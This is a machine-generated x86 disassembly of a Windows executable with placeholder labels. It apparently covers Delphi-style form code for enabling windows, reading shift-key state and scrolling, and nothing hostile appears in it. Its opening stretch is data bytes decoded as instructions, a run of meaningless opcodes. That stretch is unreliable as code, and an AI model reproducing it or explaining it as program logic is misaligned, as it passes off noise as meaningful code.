or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
in al dx
mov [ 0x10045 ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x7a ] cl
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rcr al 0x7a
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jpo r-xdata
je r-xdata
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xffffffff9045bb06
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x7bd20045 ] ch
inc ebp
add [ edx + eax ] bl
add [ eax ] al
test ah ch
inc ebx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ ebp + ebp * 2 + 0x4ef40044 ] dh
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ eax - 0x53 ] cl
inc ebp
add [ edi ] bl
inc ebp
add [ eax + 0x68 ] al
inc esp
add ah cl
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax ] ch
inc esp
add ah bl
cmpsb [ esi ] [ edi ]
inc ebp
add al bl
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ edi ] bh
inc ebp
add ah ch
test eax 0xac200045
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp [ esp + ebp * 4 ]
add [ eax - 0x6bffbbe0 ] cl
push ebx
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc esp
sub_4583b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_459158
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ esi ] al
dec edi
outsb
push ebx
push 0xe270776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 - 0x6d33ffbb ] dl
aad 0x45
add ah cl
xor [ eax ] eax
call 0xfffffffff045d1ce
mov cl 0x45
inc ebp
add [ eax - 0xbffbfcc ] dl
jb r-xdata
add [ eax - 0xbffba43 ] dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ eax - 0x53 ] cl
inc ebp
add [ esp + eax * 8 + 0x45 ] dl
add [ eax + 0x68 ] al
inc esp
add [ eax ] bl
rol [ ebp ] 0x1
js r-xdata
inc esp
inc ebp
add [ ebx + edx * 8 ] dh
inc ebp
add al bl
push 0x68dc0044
inc esp
add [ eax + 0x3c0045d5 ] dh
inc esp
add ah ch
xchg ebx eax
inc esp
add [ esp + ebx * 8 - 0x5a3fffbb ] ah
inc esp
add [ eax ] dh
nop
inc esp
add [ eax + 0x3c0045f1 ] bh
cmpsd [ esi ] [ edi ]
inc ebp
add ah ch
test eax 0xe2980045
inc ebp
add ah dl
mov dl 0x45
add [ eax - 0x4d ] dl
inc ebp
add [ eax + 0xc0045f5 ] bl
mov al 0x45
add [ eax + esi * 8 - 0x2883ffbb ] bl
inc ebp
add [ eax - 0xe ] dl
inc ebp
add [ edi * 4 + 0x90045 ] dh
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
add al dh
sahf
inc esp
add [ eax - 0x49 ] ah
inc ebp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + edi * 8 + 0x45 ] dl
add ah ch
mov bl 0x45
add al bh
mov ah 0x45
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ eax - 0x43 ] dh
inc ebp
add [ ebx + ecx + 0x42 ] bh
add [ eax ] dl
stc
inc ebp
add al ch
cli
inc ebp
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax + 0x50004494 ] al
mov edx 0x91800045
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ ebx + edi * 4 + 0x45 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ eax ] bh
mov ebp 0xbc040045
inc ebp
add [ esp + ebp + 0x44 ] cl
inc esp
outsd
arpl [ ebx + 0x4 ] bp
loop r-xdata
inc ebp
add al bh
add al [ eax ]
add [ eax - 0x67ffba80 ] dh
push cs
inc edx
add ah dl
scasd [ edi ]
inc ebp
add [ eax - 0x6fffba4f ] cl
xor al 0x40
add ah dh
xchg edx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax + 0x4591 ] 0x0
sub_4592a4
mov edi 0xccffbdff
cld
inc ebp
add ah dh
cld
inc ebp
add [ ebp + edi * 8 - 0x21bffbb ] cl
inc ebp
add [ eax - 0x2fffba02 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
je r-xdata
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2445d3a6
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
add [ eax ] al
add [ eax - 0x6d ] bh
loopne r-xdata
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xd000408d
xchg ebx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
inc ebp
add [ eax ] ah
xchg esp eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
xchg esp eax
inc ebp
add [ eax + 0x34000000 ] ah
lea eax [ ecx ]
cwde
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2c45d3fe
add [ esi ] eax
dec eax
stosd [ edi ]
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
inc eax
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax ] cl
push esp
dec ebp
outsd
mov al [ 0xffffffff90004591 ]
add [ ebp ] 0xe
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
and [ ebp + eax * 2 + 0x54070700 ] dl
push ebx
arpl [ edx + 0x65 ] si
outsb
rcl [ ebx - 0x71cfffbb ] 0x1
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
inc edx
add [ eax - 0x2bffbdf2 ] bh
inc [ ebp ]
push cs
cwde
loop r-xdata
inc ebp
add [ edi ] al
push esp
adc [ eax ] al
and al 0xcc
inc ebp
add [ eax ] bh
int3
add [ eax + edx + 0x40 ] dl
add [ esp + ecx * 8 ] ah
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc [ ebp ]
push eax
sti
inc ebp
add [ esp + edi * 8 ] dh
inc ebp
add [ eax + 0xf0045fc ] ah
push esp
inc ebx
jne r-xdata
mov eax 0xd00045fe
add ah dl
mov dl 0x45
add [ eax - 0x4d ] dl
inc ebp
add [ eax + 0xc0045f5 ] bl
mov al 0x45
add [ eax + esi * 8 - 0x2883ffbb ] bl
inc ebp
add [ eax - 0xe ] dl
inc ebp
add [ edi * 4 + 0x90045 ] dh
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffa445d4d6
adc al [ esi ]
dec eax
stosd [ edi ]
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
nop
test al 0x94
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xchg esp eax
inc ebp
add [ edx * 4 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc dl [ ebp + 0x1400045 ]
add [ eax ] al
xor al 0x8d
inc ecx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
int3
inc edx
add [ eax - 0x47ffbdf2 ] bh
adc [ esi ] al
push cs
sub_459554
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4595a0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_462d48
mov eax [ rw-data ]
call sub_4209b4
mov eax [ rw-data ]
call sub_42095c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4595d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_40279c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_459628
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4596cb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_459694
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4595d8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4596d2
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4596dc
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4027bc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_459714
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_459778
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_459714
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4597d4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4597f4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4597d4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_459820
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_460280
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4606f0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4080bc
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46026c
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4606dc
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_4080bc
test eax eax
je r-xdata
sub_4598a0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4598f4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_459930
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45997c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4599da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_457538
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041f0
mov eax [ ebp - 0x8 ]
pop edx
call sub_4080bc
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599e1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_4599ec
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_459a14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_459a85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4599ec
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459a8c
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
sub_459a94
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_459b24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41aa64
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_45a3ec
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_45a3cc
mov edx [ edi + 0xc ]
mov eax ebx
call sub_45a27c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459b74
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_459d2c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44322c
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_45a27c
xor edx edx
mov eax ebx
call sub_45a27c
jmp r-xdata
sub_459bac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b030
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_459c18
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42b030
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_459c80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_45a3b4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_45a3b4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_446094
call sub_459c18
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_446094
call sub_459bac
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_459d2c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_459d64
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_459d98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_459d64
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_459d64
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_459e14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_459d98
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4425bc
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_459d98
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_442600
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_459eac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4493d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_459f0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_45a0dd ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459e14
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459e14
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45a27c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
